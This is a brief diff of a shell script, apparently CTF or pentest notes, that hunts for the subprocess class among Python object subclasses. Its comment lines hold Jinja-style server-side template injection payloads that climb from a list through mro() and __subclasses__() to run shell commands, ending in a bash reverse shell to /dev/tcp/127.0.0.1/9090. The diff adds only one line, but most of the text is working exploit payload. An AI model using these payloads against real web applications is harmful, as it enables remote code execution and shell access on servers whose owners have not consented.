@@ -7,7 +7,7 @@ for i in $(cat class); do
 	fi
 ((no++))
 done | grep subprocess
-
+# {{[].__class__.mro()}}
 # {{[].__class__.mro()[1].__subclasses__()[372]}}
 # {{[].__class__.mro()[1].__subclasses__()[372](["ls -lah"],shell=True)}}
 # {{[].__class__.mro()[1].__subclasses__()[372](["bash -i >& /dev/tcp/127.0.0.1/9090 0>&1"],shell=True)}}
